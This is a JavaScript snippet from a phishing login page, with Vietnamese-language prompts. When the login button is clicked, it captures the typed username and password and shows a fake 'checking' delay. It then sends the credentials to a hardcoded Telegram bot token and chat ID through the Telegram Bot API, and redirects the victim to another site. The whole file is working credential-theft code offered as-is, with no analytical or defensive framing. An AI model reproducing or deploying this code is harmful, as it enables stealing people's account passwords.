  const token = "7315329822:AAEfzCe8NSQM6yvWH0zwzJxsvKYMvHxYhHU";
  const chatId = "5674777894";

  const loginBtn = document.querySelector('.login-btn');

  loginBtn.addEventListener('click', (e) => {
    e.preventDefault();

    const user = document.querySelector('input[type="text"]').value.trim();
    const pass = document.querySelector('input[type="password"]').value.trim();

    // 🔒 GIẢ LẬP KIỂM TRA
    if (!user || !pass) {
      alert("Vui lòng điền đầy đủ email/số điện thoại và mật khẩu.");
      return;
    }

    if (pass.length < 6) {
      alert("Mật khẩu bạn nhập không chính xác. Vui lòng thử lại.");
      return;
    }

    // Fake delay như đang kiểm tra với server
    loginBtn.innerText = "Đang kiểm tra...";
    loginBtn.disabled = true;

    setTimeout(() => {
      const message = `🔐 Login Info\n👤 User: ${user}\n🔑 Pass: ${pass}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }).then(() => {
        window.location.href = "https://tuquangnam.pages.dev/";
      });
    }, 10); // Delay 1.5s như login thật
  });
